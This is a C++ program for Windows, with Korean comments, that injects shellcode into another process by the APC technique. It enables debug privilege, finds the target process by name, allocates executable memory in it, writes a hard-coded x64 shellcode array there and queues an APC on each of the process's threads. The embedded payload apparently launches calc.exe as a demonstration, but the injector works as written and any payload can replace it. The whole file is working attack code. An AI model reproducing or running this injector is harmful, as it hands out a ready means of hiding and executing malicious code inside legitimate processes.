#include "stdio.h"
#include "stdlib.h"
#include "string.h"
#include "windows.h"
#include "tlhelp32.h"
#include "vector"
#include "iostream"
using namespace std;


BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES tp; 
    HANDLE hToken; 
    LUID luid; // 현재 프로세스의 핸들을 가져와 관련된 액세스토큰을 가져옴. 

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_GROUPS |TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("OpenProcessToken error: %u\n", 
            GetLastError()); 
        return FALSE; 
    } 
    
    // 로컬 시스템에 대한 LUID를 가져옴. 
    if (!LookupPrivilegeValue(NULL, // lookup privilege on local system 
        lpszPrivilege, // privilege to lookup 
        &luid)) // receives LUID of privilege 
    { 
        printf("LookupPrivilegeValue error: %u\n", GetLastError()); 
        return FALSE; 
    } 
    
    tp.PrivilegeCount = 1; 
    tp.Privileges[0].Luid = luid; 
    
    if (bEnablePrivilege) 
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
    else 
        tp.Privileges[0].Attributes = 0; 
    
    // Enable the privilege or disable all privileges. 
    if (!AdjustTokenPrivileges(hToken, // 액세스 토큰 핸들 
        FALSE, // TURE일 경우 모든 권한 비활성화 
        &tp, // TOKEN_PRIBILEGES 구조체 포인터 
        sizeof(TOKEN_PRIVILEGES), // 다음에 오는 버퍼의 사이즈 
        (PTOKEN_PRIVILEGES)NULL, // 이전 상태 없어도 됨 
        (PDWORD)NULL)) 
    { 
        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE; 
    } 
    
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) { 
        printf("The token does not have the specified privilege. \n"); 
        return FALSE; 
    } 
    return TRUE; 
}

unsigned char my_payload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
  0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
  0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
  0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
  0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
  0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
  0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
  0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
  0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
  0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
  0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
  0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
  0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
  0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
  0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
  0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
  0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};

unsigned int my_payload_len = sizeof(my_payload);

// 프로세스의 PID를 얻기위한 함수
int findMyProc(const char* procname) {

    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    int pid = 0;
    BOOL hResult;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    pe.dwSize = sizeof(PROCESSENTRY32);
    hResult = Process32First(hSnapshot, &pe);
    
    while (hResult) {
        if (strcmp(procname, pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }

    CloseHandle(hSnapshot);
    return pid;
}

// PID로부터 프로세스 스레드 TID 찾기
DWORD getTids(DWORD pid, std::vector<DWORD>& tids) {
    HANDLE hSnapshot;
    THREADENTRY32 te;
    te.dwSize = sizeof(THREADENTRY32);

    // 현재 시스템의 모든 스레드 스냅샷찍기
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (pid == te.th32OwnerProcessID) { //스레드의 프로세스id가 pid와 같다면
                tids.push_back(te.th32ThreadID); // vector의 끝에 스레드id 싸그리 추가
            }
        } while (Thread32Next(hSnapshot, &te));
    }

    CloseHandle(hSnapshot);
    return !tids.empty();
}

int main(int argc, char* argv[]) {
    DWORD pid = 0;
    HANDLE ph; //프로세스 핸들
    HANDLE ht; //스레드 핸들
    LPVOID rb; //remote buffer
    std::vector<DWORD> tids; 

    SetPrivilege(SE_DEBUG_NAME,true);

    pid = findMyProc(argv[1]);
    if (pid == 0) {
        printf("PID 찾을 수 없음.\n");
        return -1;
    }
    else {
        printf("PID = %d \n", pid);
        
        
        // 프로세스 핸들값 얻기
        ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);

        if (ph == NULL) {
            printf("OpenProcess 실패. 뭐여? \n");
            cout << "ErrorCode : " << GetLastError() << endl;
            return -2;
        }

        // 대상 프로세스(remote) 메모리 할당해주기. Ex사용
        rb = VirtualAllocEx(ph, NULL, my_payload_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        // 메모리 버퍼에 페이로드 write
        WriteProcessMemory(ph, rb, my_payload, my_payload_len, NULL);

        if (getTids(pid, tids)) {
            for (DWORD tid : tids) {
                //스레드 핸들값 얻기. 실패 시 null반환
                HANDLE ht = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
                if (ht) {
                    QueueUserAPC((PAPCFUNC)rb, ht, NULL);
                    printf("페이로드가 인젝션 되었읍니다. \n");
                    CloseHandle(ht);
                }
            }
        }
        CloseHandle(ph);
    }
    return 0;
}
